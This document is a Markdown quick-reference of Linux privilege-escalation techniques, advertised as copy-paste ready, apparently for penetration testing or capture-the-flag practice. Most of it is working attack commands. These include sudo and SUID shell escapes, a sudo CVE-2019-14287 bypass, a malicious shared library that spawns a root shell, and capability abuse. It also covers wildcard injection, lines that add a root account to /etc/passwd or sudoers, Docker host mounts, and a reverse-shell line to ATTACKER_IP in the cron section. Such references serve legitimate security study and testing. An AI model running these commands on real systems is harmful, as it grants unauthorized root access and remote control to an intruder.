# Linux Privilege Escalation

Quick reference for common privesc vectors. Commands are copy-paste ready.

---

## Sudo

```bash
sudo -l                          # Check what you can run
sudo -V                          # Check sudo version (< 1.8.28 → CVE-2019-14287)
```

**CVE-2019-14287** (sudo < 1.8.28): If `(ALL, !root)` is set:
```bash
sudo -u#-1 /bin/bash
```

### GTFOBins Sudo Exploits

| Binary | Command |
|--------|---------|
| vim | `sudo vim -c ':!/bin/bash'` |
| find | `sudo find / -exec /bin/bash \;` |
| awk | `sudo awk 'BEGIN {system("/bin/bash")}'` |
| python | `sudo python -c 'import os; os.system("/bin/bash")'` |
| python3 | `sudo python3 -c 'import os; os.system("/bin/bash")'` |
| perl | `sudo perl -e 'exec "/bin/bash";'` |
| less | `sudo less /etc/profile` then `!/bin/bash` |
| more | `sudo more /etc/profile` then `!/bin/bash` |
| man | `sudo man man` then `!/bin/bash` |
| nmap | `sudo nmap --interactive` then `!sh` (old) or `echo 'os.execute("/bin/sh")' > /tmp/x.nse && sudo nmap --script=/tmp/x.nse` |
| env | `sudo env /bin/bash` |
| ftp | `sudo ftp` then `!/bin/bash` |
| tar | `sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash` |
| zip | `sudo zip /tmp/x.zip /tmp/x -T --unzip-command="sh -c /bin/bash"` |
| git | `sudo git -p help config` then `!/bin/bash` |
| tee | `echo "kali ALL=(ALL) NOPASSWD: ALL" \| sudo tee -a /etc/sudoers` |
| bash | `sudo bash` |
| sh | `sudo sh` |

---

## SUID

```bash
find / -perm -4000 -type f 2>/dev/null    # Find all SUID binaries
find / -perm -2000 -type f 2>/dev/null    # Find all SGID binaries
```

### GTFOBins SUID Exploits

| Binary | Command |
|--------|---------|
| bash | `./bash -p` |
| cp | Copy `/etc/passwd`, add root user, copy back |
| find | `find . -exec /bin/bash -p \;` |
| nmap | `nmap --interactive` then `!sh` |
| vim | `vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-p")'` |
| python | `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'` |
| env | `env /bin/bash -p` |
| php | `php -r "pcntl_exec('/bin/bash', ['-p']);"` |
| base64 | `base64 /etc/shadow \| base64 -d` (read files as root) |

### Shared Library Hijack (SUID binary loading custom .so)
```bash
# 1. Check what libraries a SUID binary loads
strace <binary> 2>&1 | grep -i "open.*\.so"
ldd <binary>

# 2. Check for missing libraries or writable library paths
# 3. Create malicious .so:
cat > /tmp/exploit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() { setuid(0); system("/bin/bash -p"); }
EOF
gcc -shared -fPIC -o /tmp/exploit.so /tmp/exploit.c
```

---

## Capabilities

```bash
getcap -r / 2>/dev/null
```

| Capability | Risk | Exploit |
|------------|------|---------|
| cap_setuid | Critical | `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` |
| cap_setgid | High | Set GID to 0 |
| cap_dac_override | Critical | Read/write any file |
| cap_dac_read_search | High | Read any file |
| cap_sys_admin | Critical | Mount filesystems, etc. |
| cap_sys_ptrace | High | Inject into processes |

---

## Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
crontab -l
cat /var/spool/cron/crontabs/*

# Watch for running crons
# Use pspy (https://github.com/DominicBreuker/pspy)
```

**Exploit**: If a cron job runs a script you can write to:
```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /path/to/writable-script.sh
```

**Wildcard injection** (cron runs `tar` with wildcard):
```bash
echo "" > "/path/--checkpoint=1"
echo "" > "/path/--checkpoint-action=exec=sh shell.sh"
```

---

## Kernel Exploits

```bash
uname -a                    # Kernel version
cat /etc/os-release         # OS version
```

| Kernel | CVE | Exploit |
|--------|-----|---------|
| < 3.9 | CVE-2016-5195 | DirtyCow |
| 4.4-4.13 | CVE-2017-16995 | BPF priv esc |
| 5.8+ | CVE-2022-0847 | DirtyPipe |
| 5.8-5.16 | CVE-2022-2588 | route4 UAF |

```bash
# DirtyPipe (5.8 <= kernel < 5.16.11)
# Compile and run exploit binary
```

---

## Path Hijack

```bash
echo $PATH
# If PATH includes writable dirs before system dirs:
echo '/bin/bash' > /writable-path-dir/target-command
chmod +x /writable-path-dir/target-command
```

---

## Writable /etc/passwd

```bash
# Generate password hash
openssl passwd -1 newpassword

# Add root user
echo 'ghost:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd
su ghost
```

---

## NFS no_root_squash

```bash
# On target
cat /etc/exports    # Look for no_root_squash

# On attacker
showmount -e TARGET_IP
mount -o rw TARGET_IP:/share /tmp/mnt
# Create SUID shell as root on the mount
```

---

## Docker Group

```bash
id    # Check if in docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```

## LXD/LXC Group

```bash
id    # Check if in lxd group
# Import Alpine, create container with host root mounted
```
